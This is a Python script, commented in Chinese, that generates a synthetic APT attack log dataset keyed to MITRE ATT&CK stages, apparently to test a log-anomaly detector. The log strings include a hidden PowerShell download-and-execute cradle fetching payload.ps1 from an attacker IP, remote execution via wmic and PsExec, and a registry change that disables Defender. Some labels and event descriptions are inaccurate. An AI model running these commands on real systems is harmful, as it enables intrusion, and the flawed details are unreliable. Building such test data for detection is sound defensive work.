#!/usr/bin/env python3
"""
生成 APT (高级持续威胁) 攻击测试数据集
基于 MITRE ATT&CK 技术：持久化、提权、横向移动、数据窃取
"""

import random
import datetime
from datetime import datetime, timedelta

def generate_apt_attacks():
    """生成 APT 攻击日志"""
    logs = []
    base_time = datetime(2024, 12, 20, 10, 0, 0)

    # APT 组织 IP (模拟)
    apt_ips = [
        "185.220.101.46",   # Tor exit node
        "45.154.255.147",   # VPN
        "91.121.87.18",     # Proxy
        "103.35.74.12",     # C2 server
        "23.129.64.213",    # Dark web
    ]

    internal_ips = [
        "192.168.1.100",    # DC
        "192.168.1.50",     # File server
        "192.168.1.200",    # WSUS
        "10.0.0.55",        # HR server
        "172.16.0.100",     # Database
    ]

    # ========== 1. 初始访问 (Initial Access) ==========
    spearphishing_attachment = [
        "Subject: Invoice #{} - Payment Required",
        "Subject: Resume - {} Application",
        "Subject: Quarterly Report - Q4 2024",
        "Attachment: invoice_{}.doc.exe",
        "Attachment: resume_{}.pdf.exe",
        "Attachment: report_{}.xls.exe",
    ]

    for i in range(30):
        timestamp = base_time + timedelta(minutes=i * 30)
        src_ip = random.choice(apt_ips)

        # 钓鱼邮件
        log = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: {random.choice(spearphishing_attachment).format(i)}, Attachment: malicious_{i}.exe'
        logs.append(log)

        # 用户打开附件
        log2 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\\Users\\victim\\Downloads\\malicious_{i}.exe"'
        logs.append(log2)

    # ========== 2. 持久化 (Persistence) T1547 ==========
    registry_run_keys = [
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    ]

    for i in range(20):
        timestamp = base_time + timedelta(hours=i)
        hostname = random.choice(["WIN-WEB-01", "WIN-SQL-01", "WIN-APP-01"])

        # 注册表持久化
        log = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Security]: EventID=4657 A registry value was modified: ObjectName={random.choice(registry_run_keys)}\\Updater.exe, NewValue="C:\\Users\\admin\\Updater.exe"'
        logs.append(log)

        # 计划任务
        log2 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\\Windows\\System32\\Updater.exe"'
        logs.append(log2)

        # 服务安装
        log3 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\\Program Files\\Updater\\service.exe"'
        logs.append(log3)

    # ========== 3. 权限提升 (Privilege Escalation) T1068 ==========
    for i in range(15):
        timestamp = base_time + timedelta(hours=i * 2)
        hostname = random.choice(internal_ips)

        # Mimidum 权限滥用
        log = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\\Windows\\System32\\Updater.exe'
        logs.append(log)

        # 令牌窃取
        log2 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://{random.choice(apt_ips)}/payload.ps1\'))"'
        logs.append(log2)

    # ========== 4. 防御绕过 (Defense Evasion) T1076 ==========
    for i in range(25):
        timestamp = base_time + timedelta(minutes=i * 45)
        hostname = "WIN-WEB-01"

        # 禁用安全工具
        log = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Security]: EventID=4657 Registry value modified: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware=1'
        logs.append(log)
        log2 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[System]: Service Stopped: Windows Defender Antivirus Service'
        logs.append(log2)

        # 清空事件日志
        log3 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Security]: EventID=1102 The security event log was cleared: User=Administrator'
        logs.append(log3)

        # PowerShell 混淆
        log4 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)'
        logs.append(log4)

    # ========== 5. 凭证访问 (Credential Access) T1003 ==========
    for i in range(12):
        timestamp = base_time + timedelta(hours=i * 3)
        hostname = "WIN-DC-01"

        # LSASS 访问
        log = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Security]: EventID=4688 New process created: CommandLine="C:\\Windows\\System32\\lsass.exe" (but actually procspawn)'
        logs.append(log)

        # Mimikatz 活动
        log2 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator'
        logs.append(log2)
        log3 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash'
        logs.append(log3)

        # DCSync 攻击
        log4 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$'
        logs.append(log4)

    # ========== 6. 横向移动 (Lateral Movement) T1021 ==========
    for i in range(20):
        timestamp = base_time + timedelta(minutes=i * 60)
        src_host = random.choice(internal_ips)
        dst_host = random.choice(internal_ips)

        # RDP 横向移动
        log = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {dst_host}[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress={src_host}, AccountName=Administrator'
        logs.append(log)

        # WMI 远程执行
        log2 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {src_host}[Security]: EventID=4688 Process Create: CommandLine=wmic /node:{dst_host} process call create "powershell.exe -c ..."'
        logs.append(log2)

        # PsExec
        log3 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {src_host}[Security]: EventID=4688 PsExec.exe -s -d \\{dst_host} cmd.exe'
        logs.append(log3)

    # ========== 7. 数据窃取 (Exfiltration) T1041 ==========
    for i in range(10):
        timestamp = base_time + timedelta(hours=i * 4)
        hostname = random.choice(internal_ips)

        # 大量数据外传
        log = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Firewall]: OUTBOUND BLOCK TCP 192.168.1.100:52345 -> 185.220.101.46:443 (Data: 2.5GB)'
        logs.append(log)

        # DNS 隧道
        log2 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[DNS]: Query:很长的主机名模式.subdomain.apt-c2.com -> 185.220.101.46'
        logs.append(log2)

        # ICMP 数据外传
        log3 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Firewall]: OUTBOUND ICMP Type=8 Code=0 from 192.168.1.50 to 185.220.101.46 (Payload size: 1400 bytes, repeated 5000+ times)'
        logs.append(log3)

        # Cloud 数据同步
        log4 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Azure]: Upload: Container=company-backup, Files=5000+, Size=500MB, Destination=https://company-backup.s3.amazonaws.com/backup'
        logs.append(log4)

    # ========== 8. 命令控制 (C2) T1071 ==========
    for i in range(50):
        timestamp = base_time + timedelta(minutes=i * 10)
        hostname = random.choice(["WIN-WEB-01", "WIN-SQL-01", "WIN-APP-01"])

        # 定期信标
        log = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Network]: CONNECT http://{random.choice(apt_ips)}:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)'
        logs.append(log)

        # HTTPS C2
        log2 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)'
        logs.append(log2)

        # 域生成算法 (DGA)
        log3 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {hostname}[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12'
        logs.append(log3)

    return logs

def main():
    print("生成 APT (高级持续威胁) 测试数据集...")

    all_logs = generate_apt_attacks()

    # 随机打乱
    random.shuffle(all_logs)

    header = """# ============================================================
# APT (Advanced Persistent Threat) 测试数据集
# 生成时间: 2024-12-20
# 包含: 钓鱼邮件、持久化、提权、横向移动、数据窃取、C2通信
# MITRE ATT&CK 对齐
# ============================================================
"""

    output_file = "D:/PycharmProjects/deeplog/logs/apt_dataset.log"
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(header)
        f.write('\n'.join(filter(None, all_logs)))
        f.write('\n')

    print(f"\n完成！共生成 {len(all_logs)} 条日志")
    print(f"保存至: {output_file}")

if __name__ == "__main__":
    main()
